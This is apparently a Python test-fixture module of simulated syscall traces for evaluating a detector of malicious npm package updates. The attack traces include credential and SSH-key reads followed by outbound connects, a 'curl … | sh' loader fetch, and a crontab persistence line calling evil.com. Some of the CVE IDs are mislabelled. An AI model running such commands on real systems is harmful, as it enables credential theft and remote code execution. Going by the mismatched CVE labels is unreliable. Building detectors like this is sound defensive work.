"""Simulated Attack Vectors based on historical supply-chain CVE incidents.
Permanently embedded in tripwire.core for deterministic offline evaluation.
"""

from typing import Dict, Any, List

ATTACK_SCENARIOS: List[Dict[str, Any]] = [
    {
        "id": "CVE-2018-20834-EVENTSTREAM",
        "name": "flatmap-stream (Targeted Wallet & Credential Stealer)",
        "package": "flatmap-stream",
        "base_version": "0.1.0",
        "target_version": "0.1.1",
        "base_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "flatmap-stream@0.1.0"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/detonation/node_modules/flatmap-stream/index.js", O_RDONLY) = 3
1000 10:00:00.000300 read(3, "module.exports = function(){};", 30) = 30
""",
        "attack_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "flatmap-stream@0.1.1"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/detonation/node_modules/flatmap-stream/index.js", O_RDONLY) = 3
1000 10:00:00.000300 read(3, "module.exports = function(){};", 30) = 30
1000 10:00:00.000400 openat(AT_FDCWD, "/home/sandbox-runner/.aws/credentials", O_RDONLY) = 4
1000 10:00:00.000500 read(4, "aws_access_key_id = AKIA_TRIPWIRE_CANARY_01\\n", 128) = 45
1000 10:00:00.000600 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("185.199.108.153")}, 16) = 0
""",
    },
    {
        "id": "CVE-2021-42574-UAPARSER",
        "name": "ua-parser-js (Cryptominer & Dropper Infiltration)",
        "package": "ua-parser-js",
        "base_version": "0.7.28",
        "target_version": "0.7.29",
        "base_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "ua-parser-js@0.7.28"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/detonation/node_modules/ua-parser-js/package.json", O_RDONLY) = 3
""",
        "attack_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "ua-parser-js@0.7.29"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/detonation/node_modules/ua-parser-js/package.json", O_RDONLY) = 3
1000 10:00:00.000300 execve("/bin/sh", ["sh", "-c", "curl -s http://194.26.29.112/loader.sh | sh"], 0x7fff) = 0
1000 10:00:00.000400 connect(4, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("194.26.29.112")}, 16) = 0
""",
    },
    {
        "id": "CVE-2022-23812-NODEIPC",
        "name": "node-ipc (Protestware File Corrupter / Wiper)",
        "package": "node-ipc",
        "base_version": "10.1.0",
        "target_version": "10.1.1",
        "base_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "node-ipc@10.1.0"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/detonation/node_modules/node-ipc/dao/ipc.js", O_RDONLY) = 3
""",
        "attack_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "node-ipc@10.1.1"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/detonation/node_modules/node-ipc/dao/ipc.js", O_RDONLY) = 3
1000 10:00:00.000300 openat(AT_FDCWD, "/home/sandbox-runner/WITH-LOVE-FROM-AMERICA.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4
1000 10:00:00.000400 write(4, "PEACE NOT WAR", 13) = 13
""",
    },
    {
        "id": "ATTACK-CANARY-EXFIL",
        "name": "canary-harvester (Active Decoy Honeytoken Probe)",
        "package": "auth-helper-internal",
        "base_version": "2.0.0",
        "target_version": "2.0.1",
        "base_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "auth-helper@2.0.0"], 0x7fff) = 0
""",
        "attack_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "auth-helper@2.0.1"], 0x7fff) = 0
1000 10:00:00.000200 openat(AT_FDCWD, "/home/sandbox-runner/.ssh/id_rsa", O_RDONLY) = 3
1000 10:00:00.000300 read(3, "-----BEGIN OPENSSH PRIVATE KEY-----", 35) = 35
1000 10:00:00.000400 connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("45.33.32.156")}, 16) = 0
""",
    },
    {
        "id": "ATTACK-BACKDOOR-POSTINSTALL",
        "name": "malicious-preinstall (System Reconnaissance & Persistence)",
        "package": "core-utils-lib",
        "base_version": "1.4.0",
        "target_version": "1.4.1",
        "base_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "core-utils-lib@1.4.0"], 0x7fff) = 0
""",
        "attack_trace": """
1000 10:00:00.000100 execve("/usr/local/bin/node", ["node", "npm", "install", "core-utils-lib@1.4.1"], 0x7fff) = 0
1000 10:00:00.000200 execve("/bin/bash", ["bash", "-c", "cat /etc/passwd && echo '* * * * * curl evil.com' >> /etc/crontab"], 0x7fff) = 0
1000 10:00:00.000300 openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
""",
    }
]

BENIGN_PACKAGES = [
    ("express", "4.18.1", "4.18.2", True),
    ("lodash", "4.17.20", "4.17.21", False),
    ("chalk", "4.1.0", "4.1.2", False),
    ("commander", "9.0.0", "9.1.0", False),
    ("debug", "4.3.1", "4.3.4", False),
    ("esbuild", "0.14.0", "0.14.1", True),
    ("node-sass", "7.0.0", "7.0.1", True),
    ("puppeteer", "13.0.0", "13.1.0", True),
    ("sharp", "0.30.0", "0.30.1", True),
    ("semver", "7.3.5", "7.3.7", False),
    ("axios", "0.26.0", "0.26.1", False),
    ("tslib", "2.3.0", "2.3.1", False),
    ("yargs", "17.3.0", "17.4.0", False),
    ("glob", "7.2.0", "7.2.1", False),
    ("uuid", "8.3.1", "8.3.2", False),
    ("dotenv", "16.0.0", "16.0.1", False),
    ("ws", "8.5.0", "8.5.1", False),
    ("webpack", "5.70.0", "5.71.0", True),
    ("core-js", "3.21.0", "3.21.1", True),
    ("sqlite3", "5.0.2", "5.0.3", True),
]
